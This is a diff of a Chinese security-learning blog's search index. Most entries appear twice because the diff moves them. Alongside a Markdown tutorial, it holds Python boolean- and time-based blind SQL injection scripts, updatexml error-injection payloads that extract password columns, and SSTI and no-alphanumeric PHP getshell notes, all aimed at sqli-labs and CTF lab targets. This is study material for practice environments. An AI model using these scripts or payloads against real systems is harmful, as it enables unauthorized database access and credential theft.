@@ -49,6 +49,36 @@
 ]]></content>
   </entry>
   <entry>
+    <title>markdown</title>
+    <url>/2021/11/23/2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-标题的使用"><a href="#1-标题的使用" class="headerlink" title="1.标题的使用"></a>1.标题的使用</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用#加空格，空格后写标题，#号越多标题等级越低</span><br><span class="line">    # <span class="number">1</span></span><br><span class="line">    ## <span class="number">2</span></span><br><span class="line">    ### <span class="number">3</span></span><br><span class="line">    #### <span class="number">4</span></span><br><span class="line">    ##### <span class="number">5</span></span><br><span class="line">    ###### <span class="number">6</span></span><br><span class="line">    共有六个等级</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><h6 id="6"><a href="#6" class="headerlink" title="6"></a>6</h6><h1 id="2代码块的使用"><a href="#2代码块的使用" class="headerlink" title="2代码块的使用"></a>2代码块的使用</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用```后加代码的语言 </span><br><span class="line">    ```java   </span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong></p>
+<p>`要切换成英文</p>
+<h1 id="3加粗，高亮，删除符"><a href="#3加粗，高亮，删除符" class="headerlink" title="3加粗，高亮，删除符"></a>3加粗，高亮，删除符</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">*斜体* or _强调_</span><br><span class="line">**加粗** or __加粗__</span><br><span class="line">***粗斜体*** or ___粗斜体__</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+
+
+<p><em>斜体</em> or <em>强调</em> <strong>加粗</strong> or <strong>加粗</strong> <em><strong>粗斜体</strong></em> or _<strong>粗斜体</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">高亮</span><br><span class="line">`` `包裹起来` ``</span><br></pre></td></tr></table></figure>
+
+<p><code>包裹起来</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">~~加删除的内容~~</span><br></pre></td></tr></table></figure>
+
+<p><del>加删除的内容</del></p>
+<h1 id="4图片内嵌"><a href="#4图片内嵌" class="headerlink" title="4图片内嵌"></a>4图片内嵌</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">![替换的文字]（打开图片的url或绝对地址）</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/.com//ask.jpg" alt="asuka"></p>
+<h1 id="5link"><a href="#5link" class="headerlink" title="5link"></a>5link</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[替换的文字]（url）</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.google.com.hk/">百度</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>无字符getshell</title>
     <url>/2021/11/23/2-3-4/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在waf特别强的情况下，把所有的字符和数字都ban了，就要使用无字符getshell。</p>
@@ -77,36 +107,6 @@ $\_\_\_=\~(样)[$\_\_\_\_];$\_\_\_\.=~(说)[$\_\_\_\_\];$\_\__\.=~(小)[$\_\_\_\
 $\_($\$\__\_[$\_]);
 
 <?=是<?php的缩写
-]]></content>
-  </entry>
-  <entry>
-    <title>markdown</title>
-    <url>/2021/11/23/2/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-标题的使用"><a href="#1-标题的使用" class="headerlink" title="1.标题的使用"></a>1.标题的使用</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用#加空格，空格后写标题，#号越多标题等级越低</span><br><span class="line">    # <span class="number">1</span></span><br><span class="line">    ## <span class="number">2</span></span><br><span class="line">    ### <span class="number">3</span></span><br><span class="line">    #### <span class="number">4</span></span><br><span class="line">    ##### <span class="number">5</span></span><br><span class="line">    ###### <span class="number">6</span></span><br><span class="line">    共有六个等级</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><h6 id="6"><a href="#6" class="headerlink" title="6"></a>6</h6><h1 id="2代码块的使用"><a href="#2代码块的使用" class="headerlink" title="2代码块的使用"></a>2代码块的使用</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用```后加代码的语言 </span><br><span class="line">    ```java   </span><br></pre></td></tr></table></figure>
-
-<p><strong>注意</strong></p>
-<p>`要切换成英文</p>
-<h1 id="3加粗，高亮，删除符"><a href="#3加粗，高亮，删除符" class="headerlink" title="3加粗，高亮，删除符"></a>3加粗，高亮，删除符</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">*斜体* or _强调_</span><br><span class="line">**加粗** or __加粗__</span><br><span class="line">***粗斜体*** or ___粗斜体__</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-
-
-<p><em>斜体</em> or <em>强调</em> <strong>加粗</strong> or <strong>加粗</strong> <em><strong>粗斜体</strong></em> or _<strong>粗斜体</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">高亮</span><br><span class="line">`` `包裹起来` ``</span><br></pre></td></tr></table></figure>
-
-<p><code>包裹起来</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">~~加删除的内容~~</span><br></pre></td></tr></table></figure>
-
-<p><del>加删除的内容</del></p>
-<h1 id="4图片内嵌"><a href="#4图片内嵌" class="headerlink" title="4图片内嵌"></a>4图片内嵌</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">![替换的文字]（打开图片的url或绝对地址）</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/.com//ask.jpg" alt="asuka"></p>
-<h1 id="5link"><a href="#5link" class="headerlink" title="5link"></a>5link</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[替换的文字]（url）</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.google.com.hk/">百度</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -158,6 +158,29 @@ $\_($\$\__\_[$\_]);
 <p><img src="/.com//p/picture/image-20211016204431247.png" alt="picyure"></p>
 <p>把服务器设置成之前配置的</p>
 <p>然后点右上角的📞图样，打开监听，在点旁边的绿色肥甲虫，debug</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sql盲注脚本</title>
+    <url>/2021/11/23/4/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="python写sql注入脚本"><a href="#python写sql注入脚本" class="headerlink" title="python写sql注入脚本"></a>python写sql注入脚本</h1><p>在布尔盲注和时间盲注需要一个一个试的时候就需要使用python脚本</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>以sqlilab第8关为例</p>
+<p>![pictuer](D:.\picture\屏幕截图 2021-10-25 122458.png)</p>
+<p>查询成功就会返回you are in查询不成功就不返回，</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-25 161517.png)</p>
+<p>可用这个特性猜测 playload annd ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database()))=123</p>
+<p>判断表名得第一个字母的asc码值</p>
+<p>由此一个一个推断就可以得到完整的表名</p>
+<p>但手工写太累了这时候就需要写python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests<span class="comment">#引入requests库</span></span><br><span class="line">s = requests.session()<span class="comment">#创建session对象用来发送请求</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli-labs-master/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span>(<span class="params">g</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        u = <span class="built_in">str</span>(i)</span><br><span class="line">        dtlenth = g + u + <span class="string">&#x27;--+&#x27;</span><span class="comment">#Playload的构建</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> s.get(url + dtlenth).text:<span class="comment">#发送playload并判断是否成功</span></span><br><span class="line">            f=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;databaselenth:&#x27;</span> + <span class="built_in">str</span>(f))<span class="comment">#成功就输出值</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no</span>(<span class="params">k, i</span>):</span></span><br><span class="line">    lib=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">                b = <span class="built_in">str</span>(n)</span><br><span class="line">                dataname = k + <span class="built_in">str</span>(x) + <span class="string">&quot;,1))=&quot;</span> + b + <span class="string">&quot;--+&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> s.get(url + dataname).text:</span><br><span class="line">                    lib = lib + <span class="built_in">chr</span>(n)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;database:&quot;</span> + lib)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> lib</span><br><span class="line"><span class="comment"># leng=o(&#x27;and length(database())=&#x27;)</span></span><br><span class="line"><span class="comment"># dbname=no(&quot;and ascii(substr(database(),&quot;, leng)</span></span><br><span class="line"><span class="comment">#tablename=no(&quot;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), &quot;,30)</span></span><br><span class="line"><span class="comment">#columnname=no(&quot;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&quot;, 100)</span></span><br><span class="line"><span class="comment">#password=no(&quot;and ascii(substr((select group_concat(password) from users),&quot;, 200)</span></span><br><span class="line">name=no(<span class="string">&quot;and ascii(substr((select group_concat(username) from users),&quot;</span>, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>
+
+<p>![](D:\p\picture\屏幕截图 2021-10-25 165010.png)</p>
+<p>得到了数据</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>以sqlilab第9关为例无论输入什么都只会显示you are in，那就要用到时间盲注，sleep函数会让网页的响应延迟自定义的秒数，写python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://localhost/sqli-labs-master/Less-10/?id=1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span>(<span class="params">g</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        u = <span class="built_in">str</span>(i)</span><br><span class="line">        dtlenth = g + u + <span class="string">&#x27;--+&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> s.get(url + dtlenth).text:</span><br><span class="line">            f=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;databaselenth:&#x27;</span> + <span class="built_in">str</span>(f))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no</span>(<span class="params">k, i</span>):</span></span><br><span class="line">    lib=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">                b = <span class="built_in">str</span>(n)</span><br><span class="line">                dataname = k + <span class="built_in">str</span>(x) + <span class="string">&quot;,1))=&quot;</span> + b + <span class="string">&quot;,sleep(5),1)--+&quot;</span></span><br><span class="line">                Starttime=time.time()<span class="comment">#记录下当前的时间戳</span></span><br><span class="line">                response1 = requests.get(url+dataname)<span class="comment">#获取网页回应</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> time.time() - Starttime &gt; <span class="number">5</span>:<span class="comment">#获取网页回应需要的时间</span></span><br><span class="line">                    lib = lib + <span class="built_in">chr</span>(n)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;database:&quot;</span> + lib)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> lib</span><br><span class="line">j=no(<span class="string">&quot;and if(ascii(substr((select group_concat(username) from users),&quot;</span>, <span class="number">200</span>)<span class="comment">#if判断if（a，b，c）若a为真输出b，假输出c</span></span><br></pre></td></tr></table></figure>
+
+<p>![](D:\p\picture\屏幕截图 2021-10-25 171419.png)</p>
+<p>得到结果</p>
 ]]></content>
   </entry>
   <entry>
@@ -288,26 +311,30 @@ $\_($\$\__\_[$\_]);
 ]]></content>
   </entry>
   <entry>
-    <title>sql盲注脚本</title>
-    <url>/2021/11/23/4/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="python写sql注入脚本"><a href="#python写sql注入脚本" class="headerlink" title="python写sql注入脚本"></a>python写sql注入脚本</h1><p>在布尔盲注和时间盲注需要一个一个试的时候就需要使用python脚本</p>
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>以sqlilab第8关为例</p>
-<p>![pictuer](D:.\picture\屏幕截图 2021-10-25 122458.png)</p>
-<p>查询成功就会返回you are in查询不成功就不返回，</p>
-<p>![picture](D:\p\picture\屏幕截图 2021-10-25 161517.png)</p>
-<p>可用这个特性猜测 playload annd ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database()))=123</p>
-<p>判断表名得第一个字母的asc码值</p>
-<p>由此一个一个推断就可以得到完整的表名</p>
-<p>但手工写太累了这时候就需要写python脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests<span class="comment">#引入requests库</span></span><br><span class="line">s = requests.session()<span class="comment">#创建session对象用来发送请求</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli-labs-master/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span>(<span class="params">g</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        u = <span class="built_in">str</span>(i)</span><br><span class="line">        dtlenth = g + u + <span class="string">&#x27;--+&#x27;</span><span class="comment">#Playload的构建</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> s.get(url + dtlenth).text:<span class="comment">#发送playload并判断是否成功</span></span><br><span class="line">            f=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;databaselenth:&#x27;</span> + <span class="built_in">str</span>(f))<span class="comment">#成功就输出值</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no</span>(<span class="params">k, i</span>):</span></span><br><span class="line">    lib=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">                b = <span class="built_in">str</span>(n)</span><br><span class="line">                dataname = k + <span class="built_in">str</span>(x) + <span class="string">&quot;,1))=&quot;</span> + b + <span class="string">&quot;--+&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> s.get(url + dataname).text:</span><br><span class="line">                    lib = lib + <span class="built_in">chr</span>(n)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;database:&quot;</span> + lib)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> lib</span><br><span class="line"><span class="comment"># leng=o(&#x27;and length(database())=&#x27;)</span></span><br><span class="line"><span class="comment"># dbname=no(&quot;and ascii(substr(database(),&quot;, leng)</span></span><br><span class="line"><span class="comment">#tablename=no(&quot;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), &quot;,30)</span></span><br><span class="line"><span class="comment">#columnname=no(&quot;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&quot;, 100)</span></span><br><span class="line"><span class="comment">#password=no(&quot;and ascii(substr((select group_concat(password) from users),&quot;, 200)</span></span><br><span class="line">name=no(<span class="string">&quot;and ascii(substr((select group_concat(username) from users),&quot;</span>, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>
-
-<p>![](D:\p\picture\屏幕截图 2021-10-25 165010.png)</p>
-<p>得到了数据</p>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>以sqlilab第9关为例无论输入什么都只会显示you are in，那就要用到时间盲注，sleep函数会让网页的响应延迟自定义的秒数，写python脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://localhost/sqli-labs-master/Less-10/?id=1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span>(<span class="params">g</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        u = <span class="built_in">str</span>(i)</span><br><span class="line">        dtlenth = g + u + <span class="string">&#x27;--+&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> s.get(url + dtlenth).text:</span><br><span class="line">            f=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;databaselenth:&#x27;</span> + <span class="built_in">str</span>(f))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no</span>(<span class="params">k, i</span>):</span></span><br><span class="line">    lib=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">                b = <span class="built_in">str</span>(n)</span><br><span class="line">                dataname = k + <span class="built_in">str</span>(x) + <span class="string">&quot;,1))=&quot;</span> + b + <span class="string">&quot;,sleep(5),1)--+&quot;</span></span><br><span class="line">                Starttime=time.time()<span class="comment">#记录下当前的时间戳</span></span><br><span class="line">                response1 = requests.get(url+dataname)<span class="comment">#获取网页回应</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> time.time() - Starttime &gt; <span class="number">5</span>:<span class="comment">#获取网页回应需要的时间</span></span><br><span class="line">                    lib = lib + <span class="built_in">chr</span>(n)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;database:&quot;</span> + lib)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> lib</span><br><span class="line">j=no(<span class="string">&quot;and if(ascii(substr((select group_concat(username) from users),&quot;</span>, <span class="number">200</span>)<span class="comment">#if判断if（a，b，c）若a为真输出b，假输出c</span></span><br></pre></td></tr></table></figure>
-
-<p>![](D:\p\picture\屏幕截图 2021-10-25 171419.png)</p>
-<p>得到结果</p>
+    <title>sqlilab17</title>
+    <url>/2021/11/23/5/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="updata报错注入"><a href="#updata报错注入" class="headerlink" title="updata报错注入"></a>updata报错注入</h1><p>![](D:\p\picture\屏幕截图 2021-10-25 214004.png)</p>
+<p>看都题目passwor reset，重置密码，在输对用户名的正确的情况下会把用户名的密码更改为我们输入的密码</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 214449.png)</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 214501.png)</p>
+<p>再来康康源码</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 214805.png)</p>
+<p>我们看到他先用select查出了用户名密码然后再用了updata把新的密码上传</p>
+<p>password=’$password‘说明这里要用’闭合</p>
+<p>再来看返回的值</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 214501.png)</p>
+<p>没有回显点，也不是布朗类型的返回，看看会不会报错</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 215546.png)</p>
+<p>有报错那就用报错注入</p>
+<p>构造playload</p>
+<p>1’ and updatexml(1,concat(0x76,(select group_concat(password) from users),0x76),2)#</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 220011.png)</p>
+<p>报错了，意思是不能在要updata的表里查数据，那么我们套一层子查询，间接查询</p>
+<p>重新构造playload</p>
+<p>重新构造playload</p>
+<p>1’ and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users) as a),0x7e),1)#</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-25 221120.png)</p>
+<p>updatexml()的报错原理和groupby差不多，在updatexml的三个参数中输入不符合xml语法的内容就会报错并执行输入的语句</p>
 ]]></content>
   </entry>
   <entry>
@@ -364,49 +391,6 @@ $\_($\$\__\_[$\_]);
 
 
 
-]]></content>
-  </entry>
-  <entry>
-    <title>sqlilab17</title>
-    <url>/2021/11/23/5/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="updata报错注入"><a href="#updata报错注入" class="headerlink" title="updata报错注入"></a>updata报错注入</h1><p>![](D:\p\picture\屏幕截图 2021-10-25 214004.png)</p>
-<p>看都题目passwor reset，重置密码，在输对用户名的正确的情况下会把用户名的密码更改为我们输入的密码</p>
-<p>![](D:\p\picture\屏幕截图 2021-10-25 214449.png)</p>
-<p>![](D:\p\picture\屏幕截图 2021-10-25 214501.png)</p>
-<p>再来康康源码</p>
-<p>![](D:\p\picture\屏幕截图 2021-10-25 214805.png)</p>
-<p>我们看到他先用select查出了用户名密码然后再用了updata把新的密码上传</p>
-<p>password=’$password‘说明这里要用’闭合</p>
-<p>再来看返回的值</p>
-<p>![](D:\p\picture\屏幕截图 2021-10-25 214501.png)</p>
-<p>没有回显点，也不是布朗类型的返回，看看会不会报错</p>
-<p>![](D:\p\picture\屏幕截图 2021-10-25 215546.png)</p>
-<p>有报错那就用报错注入</p>
-<p>构造playload</p>
-<p>1’ and updatexml(1,concat(0x76,(select group_concat(password) from users),0x76),2)#</p>
-<p>![](D:\p\picture\屏幕截图 2021-10-25 220011.png)</p>
-<p>报错了，意思是不能在要updata的表里查数据，那么我们套一层子查询，间接查询</p>
-<p>重新构造playload</p>
-<p>重新构造playload</p>
-<p>1’ and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users) as a),0x7e),1)#</p>
-<p>![](D:\p\picture\屏幕截图 2021-10-25 221120.png)</p>
-<p>updatexml()的报错原理和groupby差不多，在updatexml的三个参数中输入不符合xml语法的内容就会报错并执行输入的语句</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>ssti</title>
-    <url>/2021/11/23/7-1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="flask框架"><a href="#flask框架" class="headerlink" title="flask框架"></a>flask框架</h1><p>flask框架是使用python编写的模板，所以我们注入的语句要符合python的语法。</p>
-<p>ssti注入的目的是让读取flag，所以要找到一个类能执行读取flag的代码</p>
-<p>__class__ #返回type类型，查看对象的类型<br>__bases__ #返回tuple类型，列出该类的基类<br>__mro__   #返回tuple类型，给出解析方法调用的顺序<br>__subclasses__() #返回内建方法builtin_function_or_method，获取一个类的子类<br>_<em>globals</em>_ #返回dict类型，对函数进行操作，获取当前空间下能使用的模块、方法、变量</p>
-<p>用上方列出的魔术方法找到能执行os或eval的类</p>
-<p>然后用__init __魔术方法在该类被调用的时候执行读flag的代码</p>
-<h1 id="smarty模板"><a href="#smarty模板" class="headerlink" title="smarty模板"></a>smarty模板</h1><p>smarty模板是基于php的模板并且能直接用system函数执行系统命令</p>
-<p>smarty中可以用if来快速读取flag语法</p>
-<p>{if readfile(/flag)}{/if}</p>
-<h1 id="twig模板"><a href="#twig模板" class="headerlink" title="twig模板"></a>twig模板</h1><p>twig模板也是基于php的一个模板，与smarty不同他不能直接使用函数</p>
-<p>详情参考</p>
-<p><a href="https://xz.aliyun.com/t/10056">https://xz.aliyun.com/t/10056</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -469,5 +453,41 @@ $\_($\$\__\_[$\_]);
 <p>![](D:\p\picture\屏幕截图 2021-10-26 195738.png)</p>
 <p>成功</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>ssti</title>
+    <url>/2021/11/23/7-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="flask框架"><a href="#flask框架" class="headerlink" title="flask框架"></a>flask框架</h1><p>flask框架是使用python编写的模板，所以我们注入的语句要符合python的语法。</p>
+<p>ssti注入的目的是让读取flag，所以要找到一个类能执行读取flag的代码</p>
+<p>__class__ #返回type类型，查看对象的类型<br>__bases__ #返回tuple类型，列出该类的基类<br>__mro__   #返回tuple类型，给出解析方法调用的顺序<br>__subclasses__() #返回内建方法builtin_function_or_method，获取一个类的子类<br>_<em>globals</em>_ #返回dict类型，对函数进行操作，获取当前空间下能使用的模块、方法、变量</p>
+<p>用上方列出的魔术方法找到能执行os或eval的类</p>
+<p>然后用__init __魔术方法在该类被调用的时候执行读flag的代码</p>
+<h1 id="smarty模板"><a href="#smarty模板" class="headerlink" title="smarty模板"></a>smarty模板</h1><p>smarty模板是基于php的模板并且能直接用system函数执行系统命令</p>
+<p>smarty中可以用if来快速读取flag语法</p>
+<p>{if readfile(/flag)}{/if}</p>
+<h1 id="twig模板"><a href="#twig模板" class="headerlink" title="twig模板"></a>twig模板</h1><p>twig模板也是基于php的一个模板，与smarty不同他不能直接使用函数</p>
+<p>详情参考</p>
+<p><a href="https://xz.aliyun.com/t/10056">https://xz.aliyun.com/t/10056</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>awd</title>
+    <url>/2021/11/23/awd/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>因为是第一次打awd，写点东西总结一下</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>其实在打awd之前就写了个批量脚本，准备了流量监控脚本。但是因为批量脚本报错，心开始慌乱，所以比赛开始前期的flag都是手提的。</p>
